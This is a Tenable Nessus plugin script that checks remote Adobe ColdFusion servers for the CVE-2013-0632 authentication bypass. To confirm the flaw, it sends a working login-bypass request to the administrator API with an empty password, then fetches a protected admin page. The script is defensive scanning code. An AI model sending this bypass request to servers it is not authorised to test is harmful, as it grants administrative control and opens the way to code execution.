#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(64689);
  script_version("$Revision: 1.14 $");
  script_cvs_date("$Date: 2016/11/17 21:38:53 $");

  script_cve_id("CVE-2013-0632");
  script_bugtraq_id(57330);
  script_osvdb_id(89096);
  script_xref(name:"EDB-ID", value:"24946");
  script_xref(name:"EDB-ID", value:"27755");
  script_xref(name:"EDB-ID", value:"30210");

  script_name(english:"Adobe ColdFusion Authentication Bypass (APSB13-03)");
  script_summary(english:"Bypasses authentication.");

  script_set_attribute(attribute:"synopsis", value:
"A web management interface running on the remote host is affected by
an authentication bypass vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Adobe ColdFusion running on the remote host is affected
by an authentication bypass vulnerability. When RDS is disabled and
not configured with password protection, it is possible to
authenticate as an administrative user without providing a username or
password. A remote, unauthenticated attacker can exploit this to gain
administrative access to the ColdFusion Administrator interface. After
authenticating, it is possible to write arbitrary files to the host,
resulting in arbitrary code execution. This vulnerability is being
exploited in the wild.

This version of ColdFusion is reportedly affected by several
additional vulnerabilities; however, Nessus has not checked for those
issues.");
  script_set_attribute(attribute:"see_also", value:"http://forums.adobe.com/message/4962104");
  # http://www.carehart.org/blog/client/index.cfm/2013/1/2/Part2_serious_security_threat
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?832b0298");
  script_set_attribute(attribute:"see_also", value:"http://www.adobe.com/support/security/advisories/apsa13-01.html");
  script_set_attribute(attribute:"see_also", value:"http://www.adobe.com/support/security/bulletins/apsb13-03.html");
  # http://helpx.adobe.com/coldfusion/kb/coldfusion-security-hotfix-apsb13-03.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?d7a32ae4");
  script_set_attribute(attribute:"solution", value:
"Apply the appropriate hotfix referenced in Adobe security bulletin
APSB13-03.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Adobe ColdFusion 9 Administrative Login Bypass');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/12/28");  # forum post
  script_set_attribute(attribute:"patch_publication_date", value:"2013/01/15"); # APSB13-03
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/02/19");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:adobe:coldfusion");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_GATHER_INFO);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2016 Tenable Network Security, Inc.");

  script_dependencies("coldfusion_detect.nasl", "coldfusion_rds_detect.nasl");
  script_require_keys("installed_sw/ColdFusion");
  script_require_ports("Services/www", 80, 8500);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("http.inc");
include("misc_func.inc");
include("install_func.inc");

app = 'ColdFusion';
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80);

install = get_single_install(
  app_name : app,
  port     : port
);
dir = install['path'];
install_url = build_url(port:port, qs:dir);

# In ColdFusion 9.x, the vulnerability exists if RDS is disabled.
# In CF 10 it's present if RDS is disabled _and_ configured to not require
# authentication. In the name of avoiding false positives and negatives,
# this plugin will only bail out if RDS is enabled and authentication
# is not required, an issue which is already reported by a different
# plugin (coldfusion_rds_unauthenticated.nasl)
rds_enabled = get_kb_item('coldfusion/' + port + '/rds/enabled');
if (rds_enabled)
  exit(0, "RDS is enabled on the " +app+ " install at " + install_url);

# first, get a session ID as the admin user
auth_url = '/adminapi/administrator.cfc?method=login&adminpassword=&rdsPasswordAllowed=true';
res = http_send_recv3(method:'GET', item:dir+auth_url, port:port, exit_on_fail:TRUE);

# success: <wddxPacket version='1.0'><header/><data><boolean value='true'/></data></wddxPacket>
# failure: <wddxPacket version='1.0'><header/><data><boolean value='false'/></data></wddxPacket>
# if the server doesn't explicitly say the login failed, keep going just in case it worked and
# an unexpected response was received
if ('false' >< res[2])
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);

# request a page that requires authentication, in order to verify the auth bypass worked
about_url = '/administrator/aboutcf.cfm';
res = http_send_recv3(method:'GET', item:dir+about_url, port:port, exit_on_fail:TRUE);

if (
  'About ColdFusion Administrator' >!< res[2] &&
  res[2] !~ 'Version: *(<[^>+>)([0-9,.]+)'
)
{
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
}

if (report_verbosity > 0)
{
  report =
    '\nNessus was able to login without authenticating by requesting :\n\n' +
    install_url + auth_url + '\n' +
    '\nThe login was verified by requesting the following page, which' +
    '\nrequires authentication :\n\n' +
    install_url + about_url + '\n';
  security_hole(port:port, extra:report);
}
else security_hole(port);
